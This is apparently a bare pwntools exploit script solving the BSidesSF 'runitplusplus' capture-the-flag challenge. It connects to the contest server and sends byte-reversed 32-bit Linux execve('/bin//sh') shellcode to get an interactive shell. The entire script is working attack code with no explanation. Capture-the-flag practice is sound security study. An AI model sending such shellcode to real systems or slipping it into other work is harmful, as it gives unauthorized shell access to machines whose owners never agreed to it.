from pwn import *

#p=process('./runitplusplus')
p=remote('runitplusplus-a36bf652.challenges.bsidessf.net',5353)

p.recv(2020)
sleep(1)
p.send('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'[::-1])

p.interactive()
